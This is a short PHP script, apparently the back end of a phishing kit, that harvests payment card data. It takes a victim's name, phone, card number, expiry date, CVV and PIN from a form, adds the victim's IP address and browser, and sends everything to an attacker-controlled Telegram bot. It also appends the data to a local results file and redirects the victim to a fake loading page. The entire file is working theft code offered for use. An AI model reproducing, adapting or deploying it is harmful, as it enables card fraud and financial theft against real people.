<?php
include './config.php';
include '../Files/IpBlocker.php';

$zabi = getenv("REMOTE_ADDR");
$message .= "[]-----------------[ CVV ES ]-----------------[]\n";
$message .= "full name : ".$_POST['fname']."\n";
$message .= "phone : ".$_POST['phone']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp month : ".$_POST['exp-month']."\n";
$message .= "Exp year : ".$_POST['exp-year']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "pin : ".$_POST['pin']."\n";
$message .= "<>-------------------< IP Infos >-----------------<>\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[]-----------------< PAYL01D IS BACK >-----------------[]\n";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);
header("Location: ../Pages/loading1.php");
?>
